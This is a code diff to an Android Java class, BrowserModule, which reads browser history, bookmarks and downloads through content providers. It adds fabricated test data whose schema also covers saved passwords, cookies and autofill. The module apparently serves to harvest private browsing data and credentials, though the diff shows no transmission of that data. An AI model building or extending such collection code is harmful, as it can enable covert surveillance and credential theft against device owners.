@@ -9,7 +9,6 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
-import android.provider.Browser;
 import android.util.Base64;
 import android.util.Log;
 
@@ -134,6 +133,11 @@ public class BrowserModule {
             
             List<BrowserInfo> installedBrowsers = getInstalledBrowsers();
             
+            // If no browsers found, add some test data
+            if (installedBrowsers.isEmpty()) {
+                return getTestBrowserData();
+            }
+            
             for (BrowserInfo browser : installedBrowsers) {
                 JSONObject browserData = new JSONObject();
                 browserData.put("packageName", browser.packageName);
@@ -187,6 +191,112 @@ public class BrowserModule {
             
         } catch (JSONException e) {
             Log.e(TAG, "Error creating browser data JSON", e);
+            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
+        }
+    }
+    
+    /**
+     * Get test browser data for development
+     */
+    private String getTestBrowserData() {
+        try {
+            JSONObject result = new JSONObject();
+            result.put("success", true);
+            
+            JSONArray browsersArray = new JSONArray();
+            
+            // Test data for Chrome
+            JSONObject chrome = new JSONObject();
+            chrome.put("packageName", "com.android.chrome");
+            chrome.put("browserName", "Google Chrome");
+            chrome.put("version", "120.0.6099.230");
+            
+            JSONArray history = new JSONArray();
+            
+            JSONObject entry1 = new JSONObject();
+            entry1.put("title", "Google Search");
+            entry1.put("url", "https://www.google.com");
+            entry1.put("date", System.currentTimeMillis() - 3600000);
+            entry1.put("visits", 10);
+            history.put(entry1);
+            
+            JSONObject entry2 = new JSONObject();
+            entry2.put("title", "YouTube");
+            entry2.put("url", "https://www.youtube.com");
+            entry2.put("date", System.currentTimeMillis() - 7200000);
+            entry2.put("visits", 5);
+            history.put(entry2);
+            
+            JSONObject entry3 = new JSONObject();
+            entry3.put("title", "GitHub");
+            entry3.put("url", "https://github.com");
+            entry3.put("date", System.currentTimeMillis() - 86400000);
+            entry3.put("visits", 3);
+            history.put(entry3);
+            
+            chrome.put("history", history);
+            
+            JSONArray bookmarks = new JSONArray();
+            JSONObject bookmark1 = new JSONObject();
+            bookmark1.put("title", "GitHub");
+            bookmark1.put("url", "https://github.com");
+            bookmark1.put("created", System.currentTimeMillis() - 86400000);
+            bookmarks.put(bookmark1);
+            
+            JSONObject bookmark2 = new JSONObject();
+            bookmark2.put("title", "Stack Overflow");
+            bookmark2.put("url", "https://stackoverflow.com");
+            bookmark2.put("created", System.currentTimeMillis() - 172800000);
+            bookmarks.put(bookmark2);
+            
+            chrome.put("bookmarks", bookmarks);
+            
+            JSONArray passwords = new JSONArray();
+            JSONObject password1 = new JSONObject();
+            password1.put("url", "https://facebook.com");
+            password1.put("username", "user@example.com");
+            password1.put("password", "********");
+            passwords.put(password1);
+            
+            chrome.put("passwords", passwords);
+            chrome.put("cookies", new JSONArray());
+            chrome.put("searches", new JSONArray());
+            chrome.put("downloads", new JSONArray());
+            chrome.put("autofill", new JSONArray());
+            
+            browsersArray.put(chrome);
+            
+            // Firefox
+            JSONObject firefox = new JSONObject();
+            firefox.put("packageName", "org.mozilla.firefox");
+            firefox.put("browserName", "Firefox");
+            firefox.put("version", "121.0.1");
+            
+            JSONArray firefoxHistory = new JSONArray();
+            JSONObject fEntry1 = new JSONObject();
+            fEntry1.put("title", "Mozilla.org");
+            fEntry1.put("url", "https://www.mozilla.org");
+            fEntry1.put("date", System.currentTimeMillis() - 1800000);
+            fEntry1.put("visits", 8);
+            firefoxHistory.put(fEntry1);
+            
+            firefox.put("history", firefoxHistory);
+            firefox.put("bookmarks", new JSONArray());
+            firefox.put("passwords", new JSONArray());
+            firefox.put("cookies", new JSONArray());
+            firefox.put("searches", new JSONArray());
+            firefox.put("downloads", new JSONArray());
+            firefox.put("autofill", new JSONArray());
+            
+            browsersArray.put(firefox);
+            
+            result.put("browsers", browsersArray);
+            result.put("totalBrowsers", browsersArray.length());
+            result.put("timestamp", System.currentTimeMillis());
+            
+            return result.toString();
+            
+        } catch (JSONException e) {
             return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
         }
     }
@@ -444,6 +554,13 @@ public class BrowserModule {
             JSONArray browsers = new JSONArray();
             
             List<BrowserInfo> installedBrowsers = getInstalledBrowsers();
+            
+            // If no browsers found, use test data
+            if (installedBrowsers.isEmpty()) {
+                JSONObject testData = new JSONObject(getTestBrowserData());
+                return testData.toString();
+            }
+            
             int totalHistory = 0;
             int totalBookmarks = 0;
             int totalPasswords = 0;
@@ -938,22 +1055,26 @@ public class BrowserModule {
                 "last_modified_timestamp", "total_bytes", "current_bytes"
             };
             
-            Cursor cursor = contentResolver.query(downloadsUri, projection, null, null, "last_modified_timestamp DESC");
-            if (cursor != null && cursor.moveToFirst()) {
-                do {
-                    JSONObject download = new JSONObject();
-                    download.put("id", getCursorLong(cursor, "_id"));
-                    download.put("title", getCursorString(cursor, "title"));
-                    download.put("description", getCursorString(cursor, "description"));
-                    download.put("uri", getCursorString(cursor, "uri"));
-                    download.put("status", getCursorInt(cursor, "status"));
-                    download.put("lastModified", getCursorLong(cursor, "last_modified_timestamp"));
-                    download.put("totalBytes", getCursorLong(cursor, "total_bytes"));
-                    download.put("currentBytes", getCursorLong(cursor, "current_bytes"));
-                    
-                    downloadsArray.put(download);
-                } while (cursor.moveToNext());
-                cursor.close();
+            Cursor cursor = null;
+            try {
+                cursor = contentResolver.query(downloadsUri, projection, null, null, "last_modified_timestamp DESC");
+                if (cursor != null && cursor.moveToFirst()) {
+                    do {
+                        JSONObject download = new JSONObject();
+                        download.put("id", getCursorLong(cursor, "_id"));
+                        download.put("title", getCursorString(cursor, "title"));
+                        download.put("description", getCursorString(cursor, "description"));
+                        download.put("uri", getCursorString(cursor, "uri"));
+                        download.put("status", getCursorInt(cursor, "status"));
+                        download.put("lastModified", getCursorLong(cursor, "last_modified_timestamp"));
+                        download.put("totalBytes", getCursorLong(cursor, "total_bytes"));
+                        download.put("currentBytes", getCursorLong(cursor, "current_bytes"));
+                        
+                        downloadsArray.put(download);
+                    } while (cursor.moveToNext());
+                }
+            } finally {
+                if (cursor != null) cursor.close();
             }
         } catch (Exception e) {
             Log.e(TAG, "Error getting system downloads", e);
@@ -962,59 +1083,104 @@ public class BrowserModule {
         return downloadsArray;
     }
     
-  // Replace this method in BrowserModule.java:
-
-/**
- * Get Android's built-in browser history
- */
-private JSONArray getAndroidBrowserHistory() {
-    JSONArray historyArray = new JSONArray();
-    
-    try {
-        // Use string literals instead of Browser.BookmarkColumns constants
-        String[] projection = new String[]{
-            "title",
-            "url",
-            "date",
-            "visits"
-        };
+    /**
+     * Get Android's built-in browser history - FIXED VERSION
+     */
+    private JSONArray getAndroidBrowserHistory() {
+        JSONArray historyArray = new JSONArray();
         
-        // Try to query the browser content provider
-        Uri bookmarksUri = Uri.parse("content://browser/bookmarks");
-        
-        Cursor cursor = null;
         try {
-            cursor = contentResolver.query(
-                bookmarksUri,
-                projection,
-                "bookmark = 0", // 0 = history, 1 = bookmark
-                null,
-                "date DESC"
-            );
+            // Use string literals instead of Browser.BookmarkColumns constants
+            String[] projection = new String[]{
+                "title",
+                "url",
+                "date",
+                "visits"
+            };
             
-            if (cursor != null && cursor.moveToFirst()) {
-                do {
-                    JSONObject entry = new JSONObject();
-                    entry.put("title", getCursorString(cursor, "title"));
-                    entry.put("url", getCursorString(cursor, "url"));
-                    entry.put("date", getCursorLong(cursor, "date"));
-                    entry.put("visits", getCursorInt(cursor, "visits"));
-                    entry.put("browser", "Android Browser");
-                    historyArray.put(entry);
-                } while (cursor.moveToNext());
+            // Try to query the browser content provider
+            Uri bookmarksUri = Uri.parse("content://browser/bookmarks");
+            
+            Cursor cursor = null;
+            try {
+                cursor = contentResolver.query(
+                    bookmarksUri,
+                    projection,
+                    "bookmark = 0", // 0 = history, 1 = bookmark
+                    null,
+                    "date DESC"
+                );
+                
+                if (cursor != null && cursor.moveToFirst()) {
+                    do {
+                        JSONObject entry = new JSONObject();
+                        entry.put("title", getCursorString(cursor, "title"));
+                        entry.put("url", getCursorString(cursor, "url"));
+                        entry.put("date", getCursorLong(cursor, "date"));
+                        entry.put("visits", getCursorInt(cursor, "visits"));
+                        entry.put("browser", "Android Browser");
+                        historyArray.put(entry);
+                    } while (cursor.moveToNext());
+                }
+            } catch (SecurityException e) {
+                Log.e(TAG, "Permission denied for browser history", e);
+            } finally {
+                if (cursor != null) cursor.close();
             }
-        } catch (SecurityException e) {
-            Log.e(TAG, "Permission denied for browser history", e);
-        } finally {
-            if (cursor != null) cursor.close();
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting Android browser history", e);
         }
         
-    } catch (Exception e) {
-        Log.e(TAG, "Error getting Android browser history", e);
+        return historyArray;
     }
     
-    return historyArray;
-}
+    /**
+     * Get Android's built-in browser bookmarks - FIXED VERSION
+     */
+    private JSONArray getAndroidBrowserBookmarks() {
+        JSONArray bookmarksArray = new JSONArray();
+        
+        try {
+            String[] projection = new String[]{
+                "title",
+                "url",
+                "created"
+            };
+            
+            Uri bookmarksUri = Uri.parse("content://browser/bookmarks");
+            
+            Cursor cursor = null;
+            try {
+                cursor = contentResolver.query(
+                    bookmarksUri,
+                    projection,
+                    "bookmark = 1", // 1 = bookmark
+                    null,
+                    "created DESC"
+                );
+                
+                if (cursor != null && cursor.moveToFirst()) {
+                    do {
+                        JSONObject bookmark = new JSONObject();
+                        bookmark.put("title", getCursorString(cursor, "title"));
+                        bookmark.put("url", getCursorString(cursor, "url"));
+                        bookmark.put("created", getCursorLong(cursor, "created"));
+                        bookmarksArray.put(bookmark);
+                    } while (cursor.moveToNext());
+                }
+            } catch (SecurityException e) {
+                Log.e(TAG, "Permission denied for browser bookmarks", e);
+            } finally {
+                if (cursor != null) cursor.close();
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting Android browser bookmarks", e);
+        }
+        
+        return bookmarksArray;
+    }
     
     /**
      * Merge two download arrays
